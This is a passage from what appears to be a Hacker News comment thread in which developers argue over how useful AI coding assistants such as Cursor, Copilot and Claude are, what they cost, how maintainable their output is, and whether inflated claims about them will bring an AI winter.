nearly as much as pounding the keyboard). It's more high level thinking and code review involved and less worrying about implementation detail. It might not work as well in domains which training data doesn't exist in. Also certainly if someone expects to come in with no knowledge and just paste code without understanding, reading and pushing back, they will have a non working mess pretty shortly. But overall these tools dramatically increase productivity in some domains is my opinion. reply meiraleal 3 hours agorootparentprevLLMs are great to go from 0 to 2b but you wanted to go to 1 so you remove and modify lots of things, get back to 1 and then go to 2. Lots of people are terrible at going from 0 to 1 in any project. Me included. LLMs helped me a lot solving this issue. It is so much easier to iterate over something. reply cml123 5 hours agorootparentprevyes, but does your colleague even fully understand what was generated? Does he have a good mental map of the organization of the project? I have a good mental map of the projects I work on because I wrote them myself. When new business problems emerge, I can picture how to solve them using the different components of those applications. If I hadn't actually written the application myself, that expertise would not exist. Your colleague may have a working application, but I seriously doubt he understands it in the way that is usually needed for maintaining it long term. I am not trying to be pessimistic, but I _really_ worry about these tools crippling an entire generation of programmers. reply alonsonic 5 hours agorootparentAI assistants are also quite good at helping you create a high level map of a codebase. They are able to traverse the whole project structure and functionality and explain to you how things are organized and what responsibilities are. I just went back to an old project (didn't remember much about it) and used Cursor to make a small bug fix and it helped me get it done in no time. I used it to identify where the issue might be based on logs and then elaborate on potential causes before then suggesting a solution and implementing it. It's the ultimate pair programmer setup. reply insane_dreamer 4 hours agorootparent> I just went back to an old project (didn't remember much about it) and used Cursor to make a small bug fix and it helped me get it done in no time. That sounds quite useful. Does Cursor feed your entire project code (traversing all folders and files) into the context? reply n_ary 4 hours agorootparentprev> I _really_ worry about these tools crippling an entire generation of programmers. Isn’t that the point? Degrade the user long enough that the competing user is on-par or below the competence of the tool so that you now have an indispensable product and justification of its cost and existence. P.S. This is what I understood from a lot of AI saints in news who are too busy parroting productivity gains without citing other consequences, such as loss of understanding of the task or expertise to fact-check. reply svantana 5 hours agorootparentprevMe too, but a more optimistic view is that this is just a nascent form of higher-level programming languages. Gray-beards may bemoan that us \"young\" developers (born after 1970) can't write machine code from memory, but it's hardly a practical issue anymore. Analogously, I imagine future software dev to consist mostly of writing specs in natural language. reply skydhash 4 hours agorootparentNo one can write machine code from memory other by writing machine for years and just memorizing them. Just like you can't start writing Python without prior knowledge. > Analogously, I imagine future software dev to consist mostly of writing specs in natural language. https://www.commitstrip.com/en/2016/08/25/a-very-comprehensi...? reply cml123 3 hours agorootparentprevI admit that my own feelings about this are heavily biased, because I _truly_ care about coding as a craft; not just a means to an end. For me, the inclusion of LLMs or AI into the process robs it of so much creativity and essence. No one would argue that a craftsman produces furniture more quickly than Wayfair, but all people would agree that the final product would be better. It does seem inevitable that some large change will happen to our profession in the years to come. I find it challenging to predict exactly how things will play out. reply allochthon 4 hours agorootparentprev> Me too, but a more optimistic view is that this is just a nascent form of higher-level programming languages. I like this take. I feel like a significant portion of building out a web app (to give an example) is boilerplate. One benefit of (e.g., younger) developers using AI to mock out web apps might be to figure out how to get past that boilerplate to something more concise and productive, which is not necessarily an easy thing to get right. In other words, perhaps the new AI tools will facilitate an understanding of what can safely be generalized from 30 years of actual code. reply mattgreenrocks 3 hours agorootparentWeb apps require a ton of boilerplate. Almost every successful web framework uses at least one type of metaprogramming, many have more than one (reflection + codegen). I’d argue web frameworks don’t even help a lot in this regard still. They pile on more concepts to the leaky abstractions of the web. They’re written by people that love the web, and this is a problem because they’re reluctant to hide any of the details just in case you need to get to them. Coworker argued that webdev fundamentally opposes abstraction, which I think is correct. It certainly explains the mountains of code involved. reply skywhopper 3 hours agorootparentprevI wouldn’t even be so sure the application “works”. All we heard is that it has pretty UI and an API and a database, but does it do something useful and does it do that thing correctly? I wouldn’t be surprised if it totally fails to save data in a restorable way, or to be consistent in its behavior. It certainly doesn’t integrate meaningfully with any existing systems, and as you say, no human has any expertise in how it works, how to maintain it, troubleshoot it, or update it. Worse, the LLM that created it also doesn’t have any of that expertise. reply threeseed 6 hours agorootparentprev> 20 year software engineering career is about to change I have also been developing for 20+ years. And have heard the exact same thing about IDEs, Search Engines, Stack Overflow, Github etc. But in my experience at least how fast I code has never been the limiting factor in my project's success. So LLMs are nice and all but isn't going to change the industry all that much. reply pluc 6 hours agorootparentThere will be a whole industry of people who fix what AI has created. I don't know if it will be faster to build the wrong thing and pay to have it fixed or to build the right thing from the get go, but after having seen some shit, like you, I have a little idea. reply Workaccount2 5 hours agorootparentThat industry will only form if LLMs don't improve from here. But the evidence, both theoretical and empirical, is quite the opposite. In fact one of the core reasons transformers gained so much traction is because they scale so well. If nothing really changes in 3-5 years, then I'd call it a flop. But the writing is on the wall that \"scale = smarts\", and what we have today still looks like a foundational stage for LLM's. reply namaria 3 hours agorootparent> In fact one of the core reasons transformers gained so much traction is because they scale so well. > If nothing really changes in 3-5 years, then I'd call it a flop Transformers have been used for what 6 years now? Will you in 6 years say \"I'll decide if they don't change the world in another 6 years?\" reply Workaccount2 3 hours agorootparentIf the difference between now and 6 years in the future is the same as the difference between now and 6 years ago, a lot of people here will be eating their hats. reply namaria 2 hours agorootparentWhy? What exactly have we got for the (how many hundred) billions of dollars poured into GPUs running transformers over the past 6 years? reply Workaccount2 2 hours agorootparentYou don't believe that models 100x better than today (OG transformers were pretty bad) would be fruitful for society? reply mattgreenrocks 3 hours agorootparentprevSelf-driving cars have been 3-5 years away for what, a decade now? reply Workaccount2 3 hours agorootparentI never paid much attention to Elon. reply dumbfounder 6 hours agorootparentprevCorrection: a whole industry of AI that will fix what AI has created. reply vocram 5 hours agorootparentWill AI also be on call when things break in production? reply tempfile 5 hours agorootparentprevno, the original comment was correct reply orwin 6 hours agorootparentprevI really believe that the front-end part can be mostly automated (the html/CSS at least), copilot is close imho (microsoft+github, I used both), but really they're useless to do anything else complex without making to much calls, proposing bad data structures, using bad /old code design. reply skydhash 4 hours agorootparentThe frontend part was already automated. We called it Dreamweaver and RAD tools. reply epicureanideal 3 hours agorootparentThank you, now I realize where I've had this feeling before! Working with AI-generated code to add new features feels like working with Dreamweaver-generated code, which was also unpleasant. It's not written the same way a human would write it, isn't written with ease of modification in mind, etc. reply JanSt 6 hours agorootparentprevCopilot is pretty bad compared to cursor with sonnet. I have used Copilot for quite a long time so I can tell. reply StefanWestfal 6 hours agorootparentprevI am curiouse, how complex was the app? I use cursor too and am very satisfied with it. It seem that is very good at code that must have been written so many times before (think react components, node.js REST api endpoints etc.) but it starts to fall of when moving into specific domains. And for me that is the best case scenario, it takes away the part we have to code / solve already solved problems again and again so we can focus more on the other parts of software engineering beyond writing code. reply skapadia 6 hours agorootparentprevDid you take a look at the code generated? Was it well designed and amenable to extension / building on top of? I've been impressed with the ability to generate \"throw away\" code for testing out an idea or rapidly prototyping something. reply rurp 3 hours agorootparentprevFairly standard greenfield projects seem to be the absolute best scenario for an LLM. It is impressive, but that's not what most professional software development work is, in my experience. Even once I know what specifically to code I spend much more time ensuring that code will be consistent and maintainable with the rest of the project than with just getting it to work. So far I haven't found LLMs to be all that good at that sort of work. reply nativeit 5 hours agorootparentprevConsidering the current state of the industry, and the prevailing corporate climate, are you sure your job is about to get easier, or are you about to experience cuts to both jobs and pay? reply charlie0 1 hour agorootparentprevSounds like CRUD boilerplate. Sure, it's great to have AI build this out and it saves a ton of time, but I've yet to see any examples (online or otherwise) or people building complex business rules and feature sets using AI. The sad part is beginners using the boilerplate code won't get any practice building apps and will completely fail at the complex parts of an app OR try to use AI to build it and it will be terrible code. reply insane_dreamer 5 hours agorootparentprevThe problem is that it only works for basic stuff for which there is a lot of existing example code out there to work with. In niche situations it's not helpful at all in writing code that works (or even close). It is helpful as a quick lookup for docs for libs or functions you don't use much, or for gotchas that you might otherwise search StackOverflow for answers to. It's good for quick-and-dirty code that I need for one-off scripts, testing, and stuff like that which won't make it into production. reply gtvwill 5 hours agorootparentprevI've coded python scripts that let me take csv data from hornresp and convert it to 3d models I can import into sketchup. I did two coding units at uni, so whilst I can read it... I can't write it from scratch to save my life. I can debug and fix scripts gpt gives me. I did the hornresp script in about 40 mins. It would have taken me weeks to learn what it produced. I'm not a mathematician, hell i did general maths at school. Currently I've been talking through scripting a method to mix dsd audio files natively without converting to tradional pcm. I'm about to use gpt to craft these scripts. There is no way I could have done this myself without years of learning. Now all I have to do is wait half a day so I can use my free gpt o credits to code it for me (I'm broke af so can't afford subs). The productivity gains are insane. I'd pay for this in a heartbeat if I could afford it. reply SJC_Hacker 4 hours agorootparentprevYeah AI can give you a good base if its something thats been done before (which admittedly, 99% of SE projects are), especially in the target language. Yeah, if you want tic-tac-toe or snake, you can simply ask ChatGPT and it will spit out something reasonable. But this is not much better than a search engine/framework to be honest. Asking it to be \"creative\" or to tweak existing code however ... reply skywhopper 3 hours agorootparentprevI hear these stories, and I have to wonder, how useful is the app really? Was it actually built to address a need or was it built to learn the coding tool? Is it secure, maintainable, accessible, deployable, and usable? Or is it just a tweaked demo? Plenty of demo apps have all those features, but would never serve as the basis for something real or meet actual customer needs. reply apwell23 6 hours agorootparentprevSo what is his plan to fix all the bugs that claude hallucinated in the code ? reply JanSt 6 hours agorootparentI'm confident you have not used Cursor Composer + Claude 3.5 Sonnet. I'd say the level of bugs is no higher than that of a typical engineer - maybe even lower. reply threeseed 6 hours agorootparentIt's only as good as its training data. Step outside of building basic web/CRUD apps and its accuracy drops off substantially. Also almost every library it uses is old and insecure. reply mewpmewp2 6 hours agorootparentYet most work seems to be CRUD related and most SaaS businesses starting up just really need those things mainly. reply whatshisface 6 hours agorootparentprevThat last point represents the biggest problem this technology will leave us with. Nobody's going to train LLMs on new libraries or frameworks when writing original code takes an order of magnitude longer than generating code for the 2023 stack. reply Workaccount2 4 hours agorootparentWith LLM's like gemini, which have massive context windows, you can just drop the full documentation for anything in the context window. It dramatically improves output. reply SubiculumCode 3 hours agorootparentprevI use phind which does searches to provide additional context reply hobs 6 hours agorootparentprevThere's no LLM for which that is true or we'd all be fired. reply joshuacc 6 hours agorootparentIn my experience it is true, but only for relatively small pieces of a system at the time. LLMs have to be orchestrated by a knowledgeable human operator to build a complete system any larger than a small library. reply ben_w 6 hours agorootparentprevIn the long term, sure. Short term, when that happens, we're going to be on Wile E. Cyote physics and keep up until we look down and notice the absence of ground. reply dagw 6 hours agorootparentprevIf all you bring to the table is the ability to reimplement simple web apps to spec, then sooner or later you probably will be fired. reply apwell23 3 hours agorootparentprevI am confident you didn't understand my comment. I didn't say anything about \"level of bugs\". reply dagw 6 hours agorootparentprevClaude is actually surprisingly good at fixing bugs as well. Feed it a code snippet and either the error message or a brief description of the problem and it will in many cases generate new code that works. reply JanSt 6 hours agorootparentprevYes, the value of a single engineer can easily double. Even a junior - and it's much easier for them to ask Claude for help than the senior engineer on the team (low barrier for unblock). reply chmod775 5 hours agorootparentprev> There was a report that Microsoft is losing $20 for every $10 spent on Copilot subscriptions, with heavy users costing them as much as $80 per month. Assuming you're one of those heavy users, would you pay >$80 a month for it? I'm probably one of those \"heavy users\", though I've only been using it for a month to see how well it does. Here's my review: Large completions (10-15 lines): It will generally spit out near-working code for any codemonkey-level framework-user frontend code, but for anything more it'll be at best amusing and a waste of time. Small completions (complete current line): Usually nails it and saves me a few keystrokes. The downside is that it competes for my attention/screen space against good old auto-completion, which costs me productivity every time it fucks up. Having to go back and fix identifiers in which it messed up the capitalization/had typos, where basic auto-complete wouldn't have failed is also annoying. I'd pay about about $40 right now because at least it has some entertainment value, being technologically interesting. reply jeremy151 4 hours agorootparentI find tools where I am manually shepherding the context into an LLM to work much better than Copilot at current. If I think thru the problem enough to articulate it and give the model a clear explanation, and choose the surrounding pieces of context (the same stuff I would open up and look at as a dev) I can be pretty sure the code generated (even larger outputs) will work and do what I wanted, and be stylistically good. I am still adding a lot in this scenario, but it's heavier on the analysis and requirements side, and less on the code creation side. If what I give it is too open ended, doesn't have enough info, etc, I'll still get a low quality output. Though I find I can steer it by asking it to ask clarifying questions. Asking it to build unit tests can help a lot too in bolstering, a few iterations getting the unit tests created and passing can really push the quality up. reply lhl 1 hour agorootparentprevWhen was this profitability report, because the cost per token generation has dropped significantly. When GPT4 was launched last year, the API cost was about $36/M blended tokens, but you can now get GPT4o tokens for about $4.4/M tokens, Gemini 1.5 Pro for $2.2/M or DeepSeek-V2 (as 21B A/236B W model that matches GPT4 on coding) for as low as $0.28/M tokens (over 100X cheaper for the same quality output over the course of about 1.5 years). The just released Qwen2.5-Coder-7B-Instruct (Apache 2.0 licensed) also basically matches/beats GPT4 on coding benchmarks and quantized can not only can run at a decent speed on just about any consumer gaming GPU, but on most new CPUs/NPUs as well. This is about a 250X smaller model than GPT4. There are now a huge array of open weight (and open source) models that are very capable and that can be run locally/on the edge. reply JanSt 7 hours agorootparentprev1) The costs will go down over time, much of the cost is the margin of NVIDIA and training new models 2) Absolutely. Thats like one hour of an engineer salary for a whole month. reply sofixa 6 hours agorootparent> The costs will go down over time, much of the cost is the margin of NVIDIA and training new models Isn't each new model bigger and heavier and thus requries more compute to train? reply JanSt 6 hours agorootparentYes, but 1) you only need to train the model once and the inference is way cheaper. Train one great model (i.e. Claude 3.5) and you can get much more than $80/month worth out of it. 2) the hardware is getting much better and prices will fall drastically once there is a bit of a saturation of the market or another company starts putting out hardware that can compete with NVIDIA reply sofixa 6 hours agorootparent> Train one great model (i.e. Claude 3.5) and you can get much more than $80/month worth out of it Until the competition outcompetes you with their new model and you have to train a new superior one, because you have no moat. Which happens what, around every month or two? > the hardware is getting much better and prices will fall drastically once there is a bit of a saturation of the market or another company starts putting out hardware that can compete with NVIDIA Where is the hardware that can compete with NVIDIA going to come from? And if they don't have competition, which they don't, why would they bring down prices? reply ben_w 5 hours agorootparent> Until the competition outcompetes you with their new model and you have to train a new superior one, because you have no moat. Which happens what, around every month or two? Eventually one of you runs out of money, but your customers keep getting better models until then; and if the loser in this race releases the weights on a suitable gratis license then your businesses can both lose. But that still leaves your customers with access to a model that's much cheaper to run than it was to create. reply JanSt 6 hours agorootparentprevThe point is not that every lab will be profitable. There only needs to be one model in the end to increase our productivity massively, which is the point I'm making. Huge margins lead to a lot of competition trying to catch up, which is what makes market economies so successful. reply Workaccount2 4 hours agorootparentprevGemini models are trained and run on Google's in house TPU's, which frankly are incredible compared to H100's. In fact Claude was trained on TPUs. Google however does not sell these, you can only lease time on them via GCP. reply robrenaud 4 hours agorootparentprevThen those new models get distilled into smaller ones. Raising the max intelligence of the models tends to raise the intelligence of all the models via distillation. reply ema 6 hours agorootparentprevIf it makes software developers 10% more productive there sure would be many companies who'd pay $80 a month per seat. reply HarHarVeryFunny 5 hours agorootparentMaybe there are people out there working in coding sweatshops churning out boilerplate code 8 hours a day, 50 weeks a year - people who's job is 100% coding (not what I would call software engineers or developers - just coders). It's easy to imagine that for such people (but do they even exist?!) there could be large productivity gains. However, for a more typical software engineer, where every project is different, you have full lifecycle responsibility from design through coding, occasional production support, future enhancements, refactorings, updates for 3rd party library/OD updates, etc/etc, then how much of your time is actually spent pure coding (non-stop typing) ?! Probably closer to 10-25%, and certainly no-where near 100%. The potential overall time saving from a tool that saves, let's say, 10-25% of your code typing is going to be 1-5%, which is probably far less than gets wasted in meetings, chatting with your work buddies, or watching bullshit corporate training videos. IOW the savings is really just inconsequential noise. In many companies the work load is cyclic from one major project to the next, with intense periods of development interspersed with quieter periods in-between. Your productivity here certainly isn't limited by how fast you can type. reply wongarsu 4 hours agorootparentA 1% time saving for a $100k/yr position is still worth $83/month. And accounting for overhead, someone who costs the company $100k only gets a $60k salary. If you pay Silicon Valley salaries this seems like a no-brainer. There are bigger time wasters elsewhere, but this is an easy win with minimal resistance or required culture change reply HarHarVeryFunny 3 hours agorootparentYeah, but companies need to see the savings on the bottom line, in real dollars, before they are going to be spending $1000/seat for this stuff. A theoretical, or actual, 1-5% of time saved typing is most likely not going to mean you can hire fewer people and actually reduce payroll, so even if the 1-5% were to show up on internal timesheets (it won't!), this internal accounting will not be reflected on the bottom line. reply renegade-otter 6 hours agorootparentprevIt's like saying \"AI is going to replace book writers because they are so much more productive now\". All you will get is more mediocre content that someone will have to fix later - the same with code. 10% more productive. What does that mean? If you mean lines of code, then it's an incredibly poor metric. They write more code, faster. Then what? What are the long-term consequences? Is it ultimately a wash, or even a detriment? https://stackoverflow.blog/2024/03/22/is-ai-making-your-code... reply ben_w 5 hours agorootparentLLMs set a new minimum level; because of this they can fill in the gaps in a skillet — if I really suck at writing unit tests, they can bring me up from \"none\" to \"it's a start\". Likewise all the other specialities within software. Personally I am having a lot of fun, as an iOS developer, creating web games. No market in that, not really, but it's fun and I wouldn't have time to update my CSS and JS knowledge that was last up-to-date in 1998. reply apwell23 6 hours agorootparentprevIt actually makes them less productive and creates havoc in codebases with hidden bugs and verbose code that ppl are copy pasting. reply ben_w 6 hours agorootparentprev> There's no accounting for taste, but keep in mind that all of these services are currently losing money, so how much would you actually be willing to pay for the service you're currently getting in order to let it break even Ok models already run locally; that aside, as the hosted ones are kinda similar quality to interns (though varying by field), the answer is \"what you'd pay an intern\". Could easily be £1500/month, depending on domain. reply brookst 7 hours agorootparentprevIs there any reason to believe costs won’t come down with scale and hardware iteration, just like they did for everything else? Short term pricing inefficiency is not relevant to long term impact. reply HarHarVeryFunny 5 hours agorootparentOf course, but every token generated by a 100B model is going to take minimally 100B FLOPS, and if this is being used as an IDE typing assistant then there is going to be a lot of tokens being generated. If there is a common shift to using additional runtime compute to improve quality of output, such as OpenAI's GPT-o1, then FLOPs required goes up massively (OpenAI has said it takes exponential increase in FLOPS/cost to generate linear gains in quality). So, while costs will of course decrease, those $20-30K NVIDEA chips are going to be kept burring, and are not going to pay for themselves ... This may end up like the shift to cloud computing that sounds good in theory (save the cost of running your own data center), but where corporate America balks when the bill comes in. It may well be that the endgame for corporate AI is to run free tools from the likes of Meta (or open source) in their own datacenter, or maybe even locally on \"AI PCs\". reply wongarsu 4 hours agorootparentWhich is why the work to improve the results of small models is so important. Running a 3B or even 1B model as typing assistant and reserving the 100B model for refactoring is a lot more viable. reply archerx 7 hours agorootparentprevI can already pay $0 a month and use uncensored local models for both text and images. Llama, Mixtral, Stable diffusion and Flux are a lot of fun and free to run locally, you should try them out. reply jsheard 6 hours agorootparentYou can pay $0 for those models because a company paid $lots to train them and then released them for free. Those models aren't going away now of course, but lets not pretend that being able to download the product of millions of dollars worth of training completely free of charge is sustainable for future developments. Especially when most of the companies releasing these open models are wildly unprofitable and will inevitably bankrupt themselves when investments dry up unless they change their trajectory. reply archerx 2 hours agorootparentYou’re acting as if computing power isn’t going to get better. With time training the models will get faster. Let me use CG rendering as an example. Back in the day only the big companies could afford to do photoreal 3D rendering because only they had access to the compute and even then it would take days to render a frame. Eventually people could do these renders at home with consumer hardware but it still took forever to render. Now we can render photoreal with path tracing at near realtime speeds. If you could go back twenty years and show CG artists the Unreal Engine 5 and show them it’s all realtime they would lose their minds. I see the same for A.I., now it’s only the big companies that can do it, then we will be able to do it at home but it will be slow and finally we will be able to train it at home for quick and cheap. reply jsheard 20 minutes agorootparentThe flipside to that metaphor is that high-end CG productions never stopped growing in scope to fill bigger and better hardware - yes you can easily render CG from back in the day on a shoestring budget now, but rendering Avatar 2 a couple of years ago still required a cluster with tens of thousands of CPU cores. Unless there's a plateau in the amount of compute you can usefully pour into training a model, those with big money to spend are always going to be several steps ahead of what us mere mortals can do. reply likium 6 hours agorootparentprevMuch could be said about open source libraries that companies release for free to use (kubernetes, react, firecracker, etc). It might be strategically make sense for them so in the meantime we’ll just reap the benefits. reply skydhash 4 hours agorootparentAll of these require maintenance, and mostly it's been a treadmill just applying updates to React codebases. Complex tools are brittle and often only makes sense at the original source. reply jazzyjackson 3 hours agorootparentprevVRAM isn't free, you just put it in the capex pile instead of opex reply gotaran 7 hours agorootparentprev$80 a month is a no brainer given the productivity multiplier. reply BaculumMeumEst 4 hours agorootparentprevI don't find this very compelling. Hardware is becoming more available and cheaper as production ramps up, and smaller models are constantly seeing dramatic improvements. reply jsemrau 5 hours agorootparentprevJust a thought exercise. If we would have an AI with the intellectual capabilities of a Ph.D holding professor in a hard science. How much would it be worth for you to have access to that AI? 100,000 ? 500,000 ? reply salawat 4 hours agorootparent0 unless what I'm interested in is that Professor's very narrowly tailored niche. It's called Piled Higher and Deeper for a reason. reply infecto 6 hours agorootparentprevDefinitely. My time is valuable and I would spend multiples more on the current subscription costs. reply CamperBob2 2 hours agorootparentprevThere's no accounting for taste, but keep in mind that all of these services are currently losing money, so how much would you actually be willing to pay for the service you're currently getting in order to let it break even? For ChatGPT in its current state, probably $1K/month. reply mklepaczewski 6 hours agorootparentprevI would, and I don't use chatgpt as much as other people. I would pay for it for each of my employees. reply HPsquared 7 hours agorootparentprevIt's called investment. You need to spend money to make money. Their costs will certainly come down. reply christkv 6 hours agorootparentprevAlso at some point you can run the equivalent model locally. There is no long term moat here i think and facebook seems hellbent of ensuring there will be no new google from llms reply KoolKat23 27 minutes agorootparentI think physics at some point will get in the way, well at least for a while. An H100 costs like $20k-$30k and there's only so much compression/efficiency they can gain without beginning to lose intelligence, purely because you can't compute out of thin air. reply jejeyyy77 5 hours agorootparentprev- it won't work. - ok it works, but it won't be useful. - ok it's useful, but it won't scale. - ok it scales, but it won't make any money. - ok it makes money, but it's not going to last. etc etc reply pdinny 5 hours agorootparentRetrospectively framing technologies that succeeded despite doubts at the time discounts those that failed. After all, you could have used the exact same response in defense of web3 tech. That doesn't mean LLMs are fated to be like web3, but similarly the outcome that the current expenditure can be recouped is far from a certainty just because there are doubters. reply farts_mckensy 4 hours agorootparentprevThere certainly has been some goal post moving over the past few months. A lot of the people in here have some kind of psychological block when it comes to technology that may potentially replace them one day. reply KoolKat23 24 minutes agorootparentYeah currently the sentiment seems to be \"okay fine it works for simple stuff but won't deal with my complex query so it can be dismissed outright.\" Save yourselves some time and use it for that simple stuff folks. reply fassssst 5 hours agorootparentprevWhy do you assume they’re losing money on inference? reply lupire 4 hours agorootparentprevPeople hate paying specifically for stuff. If Copilot came for free and Azure cost a tiny bit more, nobody would even blink. reply refulgentis 5 hours agorootparentprevCoT is not RL'ing over reasoning traces, costs have come down 87.5% since that article, and I agree generally that \"free\" is a bad price point reply rafaelmn 6 hours agorootparentprevIt's a usefull coding tool - but at the same time it displays a lack of intelligence in the responses provided. Like it will generate code like `x && Array.isarray(x)` because `x && x is something` is a common pattern I guess - but it's completely pointless in this context. It will often do roundabout shit solutions when there's trivial stuff built into the tool/library when you ask it to solve some problem. If you're not a domain expert or search for better solutions to check it you'll often end up with slop. And the \"reasoning\" feels like the most generic answers while staying on topic, like \"review this code\" will focus on bullshit rather than prioritizing the logic errors or clearing up underlying assumptions, etc. That said it's pretty good at bulk editing - like when I need to refactor crufty test cases it saves a bunch of typing. reply dathinab 6 hours agorootparentprevidk. about Claude 3.5 but if you remove implicit subventions from the AI/AGI hype then for many such tools the cost to benefit calculation of creating and operating will become ... questionable furthermore the places where such tools tend to shine the most often places where the IT industry has somewhat failed, like unnecessary verbose and bothersome to use tools, missing tooling and troublesome code reuse (so you write the same code again and again). And this LLM based tools are not fixing the problem they just kinda hiding it. And that has me worried a bit because it makes it much much less likely for the problem to ever be fixed. Like I think there is a serious chance for this tooling causing the industry to be stuck on a quite sub-par plato for many many years. So while they clearly help, especially if you have to reinvent the wheel for a thousands time, it's hard to look at them favorably. reply KoolKat23 14 minutes agorootparentThe scaling laws coming to mind. This concern becomes trivial as we scale. Its like worrying that your calculator app running on your phone could be more efficient when adding two numbers. reply Demiurge 6 hours agorootparentprev> And that has me worried a bit because it makes it much much less likely for the problem to ever be fixed. How will that ever get solved, in this universe? Look at what C++ does to C, what TypeScript does to JavaScript, what every standard does to the one before. It builds on top, without fixing the bottom, paving over the holes. If AI helps generate sane low level code, maybe it will help you make less buffer overflow mistakes. If AI can help test and design your firewall and network rules, maybe it will help you avoid exposing some holes in your CUPS service. Why not, if we're never getting rid of IP printing or C? Seems like part of the technological progress. reply mewpmewp2 6 hours agorootparentprevHopefully it will be able to also reduce boilerplate and do reasonable DRY abstractions if repetition becomes too much. E.g. I feel like it should be possible to first blast out a lot of repetitive code and then for LLM to go over all of it and abstract it reasonably, while tests are still passing. reply JonChesterfield 6 hours agorootparentCode generator in the editor has been around for ages and serves primarily to maximise boilerplate and minimise DRY. Expecting the opposite from a new code generator will yield disappointment. reply mewpmewp2 6 hours agorootparentI mean LLM can go through all the files in a source code and find repetitions that can be abstracted. Reorganize files into more appropriate structures etc. It just needs an optimal algorithm to provide optimal context for it. reply __alexs 6 hours agorootparentprevIt's not snark, it's calling out a fundamental error of extrapolating a short term change in progress to infinity. It's like looking at the first version of an IDE that got intellisense/autocomplete and deciding that we'll be able to write entire programs by just pressing tab and enter 10,000 times. reply ramblerman 6 hours agorootparentprev2 things can be true at the same time. Op is addressing the hype that there is some linear path of improvement here and chatgpt 8.5 will be AGI. To which people always seem to jump in with but it’s useful for me and makes me code faster. Which is fine and valid, just beside the point reply gm3dmo 4 hours agorootparentprevI feel like these new tools have helped me get simple programming tasks done really quickly over the last 18 months. They seem like a faster, better and more accurate replacement for googling and Stackoverflow. They seem very good at writing SQL for example. All the commas are in the right place and exactly the right amount of brackets square curly and round. But when they get it wrong, it really shows up the lack of intelligence. I hope the froth and bubble in the marketing of these tools matures into something with a little less hyperbole because they really are great just not intelligent. reply jetsetk 5 hours agorootparentprevhow come MS Teams is still trash when everyone is being so much more productive? Shouldn't MS - sitting at the source - be able to create software wonders like all the weekend warriors using AI? reply beefnugs 2 hours agorootparentprevThe economics dont make sense at all: Either you pay more and more to keep your job as it gets better, or the company pays any amount for it so they can replace you over and over as a barely useful cog. The current state of it being cheap only exist as it is in beta and they need more info from you, the expert, until it no longer needs you reply aznumeric 6 hours agorootparentprevIf you like Cursor, you should definitely check out ClaudeDev (https://github.com/saoudrizwan/claude-dev) It's been a hit in the Ai dev community and I've noticed many folks prefer it over Cursor. It's free and open-source. You use your API credits instead of subscription and it supports other LLMs like DeepSeek too. reply gorjusborg 4 hours agorootparentprevDo you think AI companies will be able to afford running massive compute farms solely so coders can get suggestions? I do not claim to know what the future holds, but I do feel the clock is ticking on the AI hype. OpenAI blew people's minds with GPTs, and people extrapolated that mind-blowing experience into a future with omniscient AI agents, but those are nowhere to be seen. If investors have AGI in mind, and it doesn't happen soon enough, I can see another winter. Remember, the other AI winters were due to a disconnect between expectations and reality of the current tech. They also started with unbelievable optimism that ended when it became clear the expectations were not reality. The tech wasn't bad back then either, it just wasn't The General Solution people were hoping for. reply PaulHoule 6 hours agorootparentprevUsually I learn my way around the reference docs for most languages I use but CSS has about 50 documents to navigate. I’ve found Copilot does a great job with CSS questions though for Java I really do run into cases where it tells me that Optional doesn’t have a method that I know is there. reply renegade-otter 6 hours agorootparentprevI have yet to watch people be THAT more productive using, say, Copilot. Outside of some annoying boilerplate that I did not have to write myself, I don't know what kind of code you are writing that makes it all so much easier. This gets worse if you are using less trendy languages. No offense, but I have only seen people who barely coded before describe being \"very productive\" with AI. And, sure, if you dabble, these systems will spit out scripts and simpler code for you, making you feel empowered, but they are not anywhere near being helpful with a semi-complex codebase. reply f1shy 6 hours agorootparentI’ve tried enough times to generate code with AI: any attempt to generate non absolutely trivial piece of code that I can do intoxicated and sleep deprived, is just junk. It takes more time and effort to correct the AI output as starting from 0. Let’s see in some years… long winter ahead. reply surgical_fire 5 hours agorootparentprevI tried many times. Things that AI is good at: - Generate boilerplate - Generate extremely simple code patterns. You need a simple CRUD API? Yeah, it can do it. - Generate solutions for established algorithms. Think of solutions for leetcode exercises. So yeah, if that's your job as a developer, that was a massive productivity boost. Playing with anything beyond that and I got varying degrees of failure. Some of which are productivity killers. The worst is when I am trying to do something in a language/framework I am not familiar with, and AI generates plausibly sounding but horribly wrong bullshit. It sends me in some deadends that take me a while to figure out, and I would have been better just looking it up by myself. reply skydhash 4 hours agorootparentAnd the solutions for these already existed: - Generate boilerplate : Snippets, templates, and code generators - Generate extremely simple code patterns : Frameworks - Generate solutions for established algorithms : Libraries. reply namaria 3 hours agorootparentLol seriously there are deterministic commands I can run that give me correct and verified boilerplate to stand up APIs. Why would I trust some probabilistic analysis of all code found online (while dissipating ungodly amounts of energy and water) to do it instead? reply skydhash 3 hours agorootparentWhen I heard people talk about writing specs in natural language, I want to ask them if they want fuzzy results too. Like 10x10=20 or having you account debited from x+e money where x is what you ask and e is any real number. Or having your smoke detector interpreting it’s sensor fuzzily too. reply surgical_fire 2 hours agorootparentprevAbsolutely. My point is that I don't think AI can meaningfully output code that would be useful beyond that, because that code is not available in its training data. Whenever I see people going on about how AI made then super productive, the only thing I ask myself is \"My brother in Christ, what the fuck are you even coding?\" reply foldr 5 hours agorootparentprevI've definitely noticed Copilot making it less annoying to write code because I don't have to type as much. But I wonder if that significant reduction in subjective annoyance causes people to overestimate how much actual time they're saving. reply ashkankiani 3 hours agorootparentprevLLMs make mediocre engineers into slightly less mediocre engineers, and non-engineers into below mediocre engineers. They do nothing above the median. I've tried dozens of times to use them productively. Outside of very very short isolated template creation for some kind of basic script or poorly translating code from one language to another, they have wasted more time for me than they saved. The area they seem to help people, including me, the most in is giving me code for something I don't have any familiarity with that seems plausible. If it's an area I've never worked in before, it could maybe be useful. Hence why the less breadth of knowledge in programming you have, the more useful it is. The problem is that you don't understand the code it produces so you have to entirely be reliant on it, and that doesn't work long term. LLMs are not and will not be ready to replace programmers within the next few years, I guarantee it. I would bet $10k on it. reply layer8 5 hours agorootparentprevI’ll be waiting for these developer benefits to translate into tangible end user benefits in software. reply freejazz 3 hours agorootparentprevNothing snarky about pointing out AGI is nowhere near reply aithrowawaycomm 6 hours agorootparentprevOP could have been more substantive, but there is no contradiction between \"current AI tools are sincerely useful\" and \"overinflated claims about the supposed intelligence of these tools will lead to an AI winter.\" I am quite confident both are true about LLMs. I use Scheme a lot, but the 1970s MIT AI folks' contention that LISPs encapsulate the core of human symbolic reasoning is 